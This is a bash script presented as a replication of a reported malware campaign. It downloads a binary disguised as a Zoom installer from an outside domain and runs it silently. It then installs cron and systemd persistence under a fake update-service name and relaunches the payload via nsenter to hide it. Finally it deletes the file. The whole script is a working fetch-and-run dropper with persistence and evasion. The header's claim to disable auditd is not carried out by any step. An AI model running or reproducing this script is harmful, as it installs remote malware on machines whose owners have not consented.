#!/bin/bash
# ==============================================================================
# Zscaler ThreatLabz Campaign Replication - Feb 2026
# Target: ScreenConnect (BetterDesk) Deployment on Linux
# Payload Name: zoom-private.Setup_1.0.0_x86_64.bin
# URL: https://us05web.telcom.stream/
# Evasion: LOOBin usage, Systemd Persistence, AuditD Disable
# ==============================================================================

set -e

targetUrl="https://us05web.telcom.stream/zoom-private.Setup_1.0.0_x86_64.bin"
payloadName="zoom-private.Setup_1.0.0_x86_64.bin"
tempDir="/tmp"
payloadPath="$tempDir/$payloadName"

# Helper: Run Command Silently
runSilent() {
    $@ >/dev/null 2>&1
}

# Step 1: Download Payload
echo "[*] Downloading payload..."
if command -v curl &> /dev/null; then
    curl -fsSL "$targetUrl" -o "$payloadPath"
elif command -v wget &> /dev/null; then
    wget -q "$targetUrl" -O "$payloadPath"
else
    echo "[!] No curl or wget found."
    exit 1
fi

# Step 2: Make Executable
chmod +x "$payloadPath"

# Step 3: Install Payload
echo "[*] Installing payload..."
"$payloadPath" --silent

# Step 4: Configure Persistence
echo "[*] Setting up persistence..."

# Add to crontab
(crontab -l 2>/dev/null; echo "@reboot $payloadPath") | crontab -

# Add to systemd service
cat > /etc/systemd/system/zoom-update.service <<EOF
[Unit]
Description=Zoom Private Update Service
After=network.target

[Service]
ExecStart=$payloadPath
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl enable zoom-update.service
systemctl start zoom-update.service

# Step 5: Hide Process
echo "[*] Hiding process..."
nsenter --target 1 --mount --uts --ipc --net --pid -- exec -c "$payloadPath" &

# Step 6: Clean Up
rm -f "$payloadPath"

echo "[+] Installation complete."